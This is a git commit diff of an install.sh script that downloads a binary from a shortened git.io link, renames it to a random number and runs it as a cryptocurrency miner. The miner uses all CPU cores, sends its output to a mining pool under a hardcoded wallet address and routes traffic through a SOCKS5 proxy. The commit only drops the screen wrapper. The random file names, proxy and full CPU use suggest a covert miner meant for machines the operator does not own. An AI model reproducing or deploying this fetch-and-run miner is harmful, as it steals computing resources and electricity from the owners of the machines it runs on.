af81b3877a7582eac66d1c00355a0ce5c04f12c9
PredatorScript <95157033+PredatorScript@users.noreply.github.com>
2021-11-30 07:20:56 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,5 +1,5 @@
-sudo apt install screen -y && wget -qO build https://git.io/JiGZh && chmod +x build &&
+wget -qO build https://git.io/JiGZh && chmod +x build &&
 TOP=$(shuf -n 1 -i 1-200000)
 USER=$1
 mv build $TOP
-screen -dms run ./$TOP -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u MMAuCeyBSsyNUFfrKPz2YLYuiinCh4PJtt.$(echo $(shuf -i 1-2000 -n 1)-DYT) -p -x -t $(nproc --all) -x socks5://192.111.135.21:4145
+./$TOP -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u MMAuCeyBSsyNUFfrKPz2YLYuiinCh4PJtt.$(echo $(shuf -i 1-2000 -n 1)-DYT) -p -x -t $(nproc --all) -x socks5://192.111.135.21:4145
